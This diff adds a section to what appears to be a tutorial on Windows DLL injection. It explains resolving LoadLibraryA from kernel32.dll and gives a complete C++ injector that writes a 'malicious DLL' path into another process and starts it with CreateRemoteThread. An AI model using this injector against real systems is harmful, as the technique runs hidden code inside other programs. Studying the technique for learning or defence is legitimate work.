@@ -244,5 +244,60 @@ As we see, WriteProcessMemory() takes the handle to the target process, the allo
 So without further complications, let's move on to the important step, which is loading our malicious DLL.
 
 
+So now have you wondered how we will load our DLL into the target process. we need a magical function that can do that, which is LoadLibraryA(). This one simply load a DLL.
 
+But wait, we need to use it to load the DLL Into the target process and no to our injector code process.
+
+So how to do that ?
+
+The way to achieve this is by retrieve the LoadLibraryA function from it's DLL which is kernel32.dll then create a remote thread for the target process to execute this LoadLibraryA that will load our malicious DLL.
+
+So how to retrieve to access kernel32.dll
+and load the function LoadLibraryA from it, we'll use GetModuleHandleA() to take a handle to kernel32.dll and then we'll use GetProcAdress() to retrieve the function LoadLibraryA() using its name.
+
+Time to get some action :
+
+Our updated code will be :
+
+```cpp
+// Injector.cpp
+#include <windows.h>
+#include <iostream>
+
+void InjectDLL(DWORD processID, const char* dllPath) {
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
+    if (!hProcess) {
+        std::cerr << "OpenProcess failed!" << std::endl;
+        return;
+    }
+
+    // Allocate memory in the target process
+    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    if (!pRemoteMemory) {
+        std::cerr << "VirtualAllocEx failed!" << std::endl;
+        CloseHandle(hProcess);
+        return;
+    }
+
+    // Write the DLL path to the allocated memory
+    if (!WriteProcessMemory(hProcess, pRemoteMemory, dllPath, strlen(dllPath) + 1, NULL)) {
+        std::cerr << "WriteProcessMemory failed!" << std::endl;
+        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return;
+    }
+
+    // Get the address of LoadLibraryA
+    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+    LPVOID pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
+
+    // Create a remote thread that calls LoadLibraryA
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pRemoteMemory, 0, NULL);
+    if (!hThread) {
+        std::cerr << "CreateRemoteThread failed!" << std::endl;
+        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return;
+    }
+}
 
